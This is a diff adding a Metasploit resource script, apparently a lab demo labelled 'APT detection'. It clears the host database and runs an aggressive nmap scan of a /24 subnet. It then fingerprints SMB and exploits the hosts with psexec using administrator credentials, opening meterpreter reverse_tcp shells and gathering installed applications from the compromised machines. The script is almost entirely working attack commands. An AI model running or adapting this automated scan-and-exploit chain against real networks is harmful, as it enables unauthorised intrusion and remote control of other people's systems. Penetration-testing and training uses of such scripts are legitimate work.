@@ -1,0 +1,35 @@
+# kernelsmith
+# Demo host APT detection
+
+# change dir to where our scripts tend to be
+cd /msf/scripts/resource
+
+# clear the screen (just eye candy)
+resource clear
+
+# load db_fun
+load db_fun
+#db_fun_debug true
+
+# delete all hosts from db
+hosts -d *
+db_search hosts
+
+# delay
+<ruby>
+	select(nil, nil, nil, 3)
+</ruby>
+
+resource clear
+
+db_nmap -O -T5 192.168.170.1/24
+db_search hosts
+resource rc_pause
+
+db_set_create newly_discovered
+db_set_run_module newly_discovered scanner/smb/smb_version
+db_set_auto
+db_set_run_module windows windows/smb/psexec windows/meterpreter/reverse_tcp SMBUser=administrator SMBPass=lab
+db_search sessions where closed_at=nil
+db_set_run_module post/windows/gather/enum_applications
+
